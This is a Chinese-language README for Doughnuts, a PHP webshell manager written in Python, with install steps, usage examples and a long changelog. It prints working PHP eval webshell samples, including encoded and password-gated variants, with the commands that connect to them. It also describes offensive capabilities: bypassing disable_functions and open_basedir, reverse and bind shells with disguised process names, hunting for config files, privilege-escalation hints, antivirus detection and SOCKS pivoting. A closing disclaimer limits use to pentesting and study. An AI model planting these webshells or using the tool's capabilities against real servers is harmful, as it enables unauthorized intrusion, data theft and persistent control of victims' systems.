# Doughnuts

*一个基于Python3.6+的PHPwebshell管理器*

![1](https://i.loli.net/2020/06/30/AURc6HN3PokZKWY.png) 

![2](https://i.loli.net/2020/06/30/op9R7JWtsBKXm6Z.png)

![3](https://i.loli.net/2020/06/30/VdAMHCyFIrle5wW.png)

![4](https://i.loli.net/2020/06/30/TpARQcw358XJx1I.png)

## 使用文档

***终于迎来了新的使用文档！***

详细使用文档请前往[此页面](http://doughnuts.cc/)进行查看。

## 特征

- 支持连接,记录,管理webshell,方便下一次连接
- 基于eval的连接,支持GET,POST,COOKIE,HEADER四种连接方式
- 请求伪装
- 支持编码payload(已内置base64,str_rot13,hex,doughnuts四种编码,可以通过添加encode文件夹中的py文件进行扩展),以实现连接带有解码的webshell
- 支持绕过open_basedir
- 支持多种方式绕过disable_functions
    - 自动识别
    - php7-backtrace
    - php7-gc
    - php7-json
    - LD_PRELOAD
    - FFI
    - COM
    - imap_open
- 核心功能
    - 获取网站,系统信息
    - 输出disbale_functions
    - 寻找可写的PHP文件(以树状结构显示)
    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)
    - 执行自定义的php代码
    - 获取一个临时的非完全交互式shell和webshell
    - 正向/反弹shell
    - (仅限双方均为*unix)获取完全交互式的反弹shell
    - 读/写/上传/下载/删除/搜索文件,目录打包
    - 数据库管理
    - 端口扫描
    - 内网网页文本式浏览代理，可自定义请求方法和数据
    - 开启socks5服务器
- 易于扩展

## 依赖

- Python3.6+
- Python-requests
- Python-pysocks
- Python-colorama
- Python-prettytable

## 安装/运行方法

***请在3.2版本之前运行过`python3 -m doughnuts.install`安装的朋友在更新3.2版本之后重新执行此命令!***

- 使用pip安装

```sh
# 安装
python3 -m pip install doughnuts --user -i https://pypi.org/simple/
# (windows)添加一个bat文件到python根目录下
# (*unix)添加一个可执行文件到/usr/local/bin下
# 安装启动器,以方便调用
python3 -m doughnuts.install
# 运行
doughnuts
# 或
python3 -m doughnuts
# enjoy it!
```

- 通过poetry安装

```sh
pyton3 -m pip install poetry # 或其他方法安装python-poetry
git clone https://github.com/WAY29/Doughnuts.git
cd Doughnuts
# debian/ubuntu系统需要运行此命令
apt-get install python3-venv
# 安装
poetry install
# 运行
poetry run python3 Doughnuts/doughnuts.py # 应该对所有系统生效
# enjoy it!
```

- 直接安装

```sh
# 安装PYTHON 3.6+
git clone https://github.com/WAY29/Doughnuts.git
cd Doughnuts/doughnuts
pip3 install -r requirements.txt 或 pip3 install requests pysocks colorma prettytable
# (windows)添加一个bat文件到python根目录下
# (*unix)添加一个可执行文件到/usr/local/bin下
# 安装启动器,以方便调用
python3 install.py
# 运行
doughnuts
# 或
python3 doughnuts.py
# enjoy it!
```

## 使用例子

*由于windows原因，在windows命令行连接下不支持&符号连接参数。
尽量将额外参数包裹引号进行传递，且逐一拆分。
好的习惯:"data:a=123" "data:b=456"
坏的习惯:"data:a=123&b=456" (在windows命令行下会连接失败)*

1. 普通webshell:

    - 最平凡的webshell:

        ```php
        //test1.php
        <?php
        error_reporting(0);
        eval($_POST['2333']);
        ?>
      ```
      那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
      ```
      connect http://localhost/test1.php POST 2333
      ```
      
    - 带解码的webshell:

        ```php
        //test2.php
        <?php
        error_reporting(0);
        eval(str_rot13(base64_decode($_REQUEST['2333'])));
        ?>
      ```
    那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
      
      ```
      connect http://localhost/test2.php POST 2333 rot13 base64
      ```
      
    - 需要额外参数与解码的webshell:

        ```php
        //test3.php
        <?php
        if(@md5($_POST['a']) == "202cb962ac59075b964b07152d234b70"){  // a=123
        	@eval(base64_decode($_POST['2333']));
        }
        ```

        那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:

        ```
        connect http://localhost/test.php POST 2333 base64 "data:a=123"
        ```

2. 生成webshell:

    1. 在执行`python3 -m doughnuts.install`之后执行`doughnuts generate a.php POST pass salt 1`在当前目录下生成Pudding类型的webshell:a.php
    2. 上传a.php,根据提示执行 `doughnuts connect {木马url} POST pass doughnuts-salt `连接至webshell




## 参考

- https://github.com/WangYihang/Webshell-Sniper
- https://github.com/epinna/weevely3

## 更新日志



### 3.6

- **修复一个严重的解析错误!!!**
- 由于种种解析上的意外,将解析回退为稳定版本

### 3.5

- 修改命令
    - checkvm命令现在归属于DETECT分类
    - connect命令 在没有webshell.log或webshell.log没有内容时会存在连接失败的问题
- 新增命令
    - av命令 (仅限于windows)检测在目标系统中运行的杀毒软件
- 3.5.1
    - 修改文件说明
    - 修改版本提示
    - 更新avlist
    - 修改checkvm的代码逻辑
- 3.5.2
    - 更改priv命令的bug曾导致离线抓取的内容并不准确
- 3.5.3(作废)
    - 修复了在python3.6的情况下某些错误导致参数解析出现问题


### 3.4
- 修改命令
   - ls命令现在可以进行二阶补全,并且可以尝试根据UID和GID获取对应用户名称(仅*unix)
   
   - exexute命令增加显示状态码和响应长度
   
   - reverse|re命令 
   
       - 添加bash、powershell(base64编码)、perl的反弹方式
       - 修改python的反弹模式，直接执行命令而不再上传文件（base64编码）
   
       - 修改windows下php的反弹模式：写入一个exe文件进行反弹，并在10秒删除（可能在某些系统下无法成功反弹）
       - reshell|rs命令 删除了mode2->script
- 新增命令
   - reaload命令(通用) 开发者命令，在不退出程序的情况下重新加载插件。
   - set命令(通用) 设置变量，然后再以后的语句中使用#{varname}来使用它。
   - get命令(通用) 获取已设置的变量。
   - save命令(通用) 将已设置好的变量存储于该工具目录下的variables.config文件中，并且每次使用该工具时都会自动读取工具目录下variables.config文件中管道变量配置。
   - checkvm命令(webshell) 简单的检查目标机器是否是虚拟机。
   - priv命令(webshell) 寻找拥有suid,属于root的文件,并根据结果显示提权帮助(仅限于*unix)
- 修复错误
   - 在非debug-dev模式下调用ic不会再引发错误
   - 在某些情况下连接成功无法写入记录



### 3.3
- 请求时添加随机Referer与UA进行伪装
- 新增依赖 pysocks
- 新增命令
    - proxy命令(通用)  设置连接代理,支持socks,http代理
    - fl命令(通用) 类似于fc命令，寻找access.log与error.log日志
- 修改命令
    - db系列命令 现在支持使用PDO扩展来连接其他数据库
    - db_init 添加参数，支持使用PDO连接其他数据库。参数db_init {host} {username} {password} {dbname=''} {port=0} {dbms='mysql'}
    - touch命令 增加创建空文件的功能（不限目标系统）
- 修复bug
    - 在某些情况下调用外带编辑器失败
    - ls后输入相关命令无法补全文件夹名
- 修改文本


### V3.2
- 新增命令
    - lsh|!命令(通用) 在当前机器中运行命令,可用于切换工作目录
    - debug命令(通用但不在帮助菜单中显示) debug SEND/LOOP 开启/关闭SEND/LOOP的调试()调试专用
    - **generate|gen命令 (初始界面) 生成php木马,使用自制的编码方式进行编码**
        - generate的调用方式:
        - 直接在交互式界面外调用:
            - 在执行`python3 -m doughnuts.install`后:`doughnuts generate a.php POST 123 1`
            - `python3 doughnuts.py generate a.php POST 123`
        - 在交互式界面调用:
            - `doughnutsgenerate a.php POST 123`
- 修改命令
    - search命令 现在search命令的调用方式为: `search {pattern} {web_file_path}`,支持正则表达式
    - c|connect 命令 (初始界面) 现在支持额外参数,并且可以在交互式界面外调用,如:
        - 在执行`python3 -m doughnuts.install`后:`doughnuts connect http://127.0.0.1/eval.php POST asd data:a=123` 
    - ls|dir 命令 现在支持模式选择：scandir(1)/glob(2)
    - write、edit、execute支持调用自定义的编辑器
- 修改项目结构
- 修改文本错误
- 修复bug


### V3.1
- 新增命令
    - rm命令(初始界面) 删除指定webshell记录
    - log命令(通用) (只支持*unix)将输入与输出记录到日志中


### V3.0
- 重新修改了bdf的顺序,添加了新模式
    - -1:close
    - auto: 自动识别
    - 0(默认):查看bdf当前状态
    - 1:php7-backtrace
    - 2:php7-gc
    - 3:php7-json
    - 4:LD_PRELOAD
    - 5:FFI
    - 6:COM
    - 7:imap_open
- 修改命令参数解析,使用shlex库进行解析
- 修复了一些在终端输入的bug
- 使用LD_PRELOAD来绕过disable_functions,在退出后会尝试自动清理


### V2.9
- 修改了bdf模式顺序,原模式2-3顺移为3-4,新增bdf命令模式
    - mode2 php7-json
        - 利用php-json反序列化绕过disable_functions
    - mode5 COM
        - 利用windows组件绕过disable_functions



### V2.8
- 修复一堆bug
- 新增bdf命令模式
    - mode2 LD_PRELOAD
        - 利用ld_preload绕过disable_functions,需要上传编译好的.so文件,若自带的.so文件不起效,请在auxiliary找到ld_preload.c自行在于目标近似的环境下编译并覆盖原文件
    - mode3 FFI
        - 利用FFI扩展绕过disable_functions,需要PHP7.4及以上


### V2.7
- 一些细微的调整
- 修改核心逻辑
- 添加命令
    - bdf 尝试绕过disable_functions.目前只支持php7-backtrace这个模式
    - bobd 尝试利用ini_set与chdir绕过open_basedir.


### V2.6
- 修复bug
- 修改命令
    - shell 可以非交互运行一句系统命令
    - webshell 可以非交互运行一句webshell代码
- 添加命令
    - execute 调用notepad/vi运行一段自定义的php代码
    - getenv 获取php环境变量


### V2.5
- 新增依赖 prettytable
- 添加一系列数据库管理命令
    - db_init 初始化数据库连接
    - db_info 输出数据库信息
    - db_use 修改当前所在数据库
    - db_dbs 输出所有数据库信息
    - db_tables 输出某个数据库的所有表信息
    - db_columns 输出某个表的所有字段信息
    - db_shell 获得一个临时的sql shell


### V2.4
- 继续优化输入,现在支持历史命令补全,命令补全以及执行ls之后的文件(夹)名补全


### V2.3
- 尝试绕过disable_functions寻找可执行的系统命令函数
- 请求错误处理
- read命令更名为cat命令,别名为c
- 添加move(mv),chmod命令


### V2.2
- 重写输入，现在支持按下ctrl+c与ctrl+d
- 添加clear命令


### V2.1
- 修改windows环境下python反弹shell上传位置,并使其可以返回错误
- 修改帮助菜单为等宽
- 添加socks命令,用于在目标主机中开启socks5服务器


### V2.0

- 修复一个BUG曾导致无法连接php7的webshell
- 修复一个BUG曾导致help无法输出对应的帮助
- 修改help命令的别名为?,现在只输入?或help将输出帮助菜单
- 修改info输出的信息
- 修改各个函数的帮助信息,变得更加统一
- 重写fc与fwpf命令,重写树状输出
- 新增ls,bindshell(only for *unix)命令

### V1.9
- 添加search命令,使用glob函数递归搜索文件.命令格式为search {pattern}

### V1.8
- 优化连接时发送的请求,从发送三次变成发送2次
- 修改pdf命令的逻辑,在连接时获取
- 优化reshell命令,命令格式为reshell {lhost} {port} {type=[python|script|upload]{1|2|3},default = 0 (Python:1 Not Python:3)} {(Only for Mode 2) fakename=/usr/lib/systemd} 三种模式分别为:1->使用python pty模块升级, 2->使用linux自带的script命令升级, 3->上传一个反弹pty的二进制文件并运行(可以伪造进程名,若无法反弹请进入libs目录拿取源码,使用目标相同发行版进行编译后覆盖原reverse_server_light文件)


### V1.7

- 修改reshell命令,修复bug,优化体验,可以随意伪装进程名
- 在libs目录下放置reverse_server_light的源码,方便编译与修改(origin:https://github.com/QAX-A-Team/ptyshell)
- 重写portscan,支持三种扫描方式


### V1.6

- 修复了若干bug
- 添加了reshell命令,监听本地端口,并让目标反弹一个完整交互式的shell(仅限双方系统都是linux且可能存在一定的问题)


### V1.5

- modify指令现在会调用notepad/vim进行编辑
- write指令现在会调用notepad/vim进行编辑
- dump命令现在使用原始php代码进行压缩,可以压缩子目录
- 优化了发送payload的间隔符

### V1.4

- 添加指令:修改文件
- 关闭debug模式
- 修复了某些情况下fwpf,fc指令无法使用的情况,现在发送数据时会关闭错误提示


## 免责声明

本项目仅供网站管理人员与渗透测试人员学习与交流,任何使用本项目进行的一切未授权攻击行为与本人无关.

